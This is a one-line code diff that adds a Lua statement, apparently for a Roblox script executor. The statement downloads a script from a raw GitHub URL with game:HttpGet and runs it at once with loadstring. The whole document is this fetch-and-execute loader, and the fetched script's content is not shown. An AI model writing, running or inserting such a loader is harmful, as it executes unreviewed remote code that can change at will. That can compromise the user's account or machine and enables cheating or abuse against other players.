@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/borthdayzz/new/main/script.lua'),true))()
